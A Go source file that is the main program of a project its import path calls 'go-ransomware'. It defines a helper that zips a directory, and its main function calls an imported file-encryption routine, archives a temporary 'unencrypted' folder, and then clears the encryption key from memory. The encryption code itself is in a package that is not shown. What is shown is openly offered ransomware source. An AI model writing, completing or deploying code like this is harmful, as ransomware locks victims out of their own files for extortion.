package main

import (
	"fmt"
	"os"
	"io"
	"archive/zip"
	"path/filepath"
	"github.com/Ywern1/go-ransomware/walker"
)

func zipSource(source, archive string) error {
	// Create a ZIP file and zip.Writer
	f, err := os.Create(archive)
	if err != nil {
		return err
	}
	defer f.Close()

	writer := zip.NewWriter(f)
	defer writer.Close()

	//Go through all the files of the source
	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		//Create a local file header
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		//set compression
		header.Method = zip.Deflate

		//Set relative path of a file as the header name
		header.Name, err = filepath.Rel(filepath.Dir(source), path)
		if err != nil {
			return err
		}
		if info.IsDir() {
			header.Name += "/"
		}

		//Create writer for the file header and save content of the file
		headerWriter, err := writer.CreateHeader(header)
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		f, err := os.Open(path)
		if err != nil {
			return err
		}
		defer f.Close()

		_, err = io.Copy(headerWriter, f)
		return err
	})

	return nil
}

func main() {
	walker.EncryptFiles()
	if err := zipSource(walker.TempDir+"unencrypted", walker.TempDir+"unencrypted.zip"); err != nil {
		fmt.Println(err)
	}
	// A way to flush from memory
	walker.EncKey = nil
}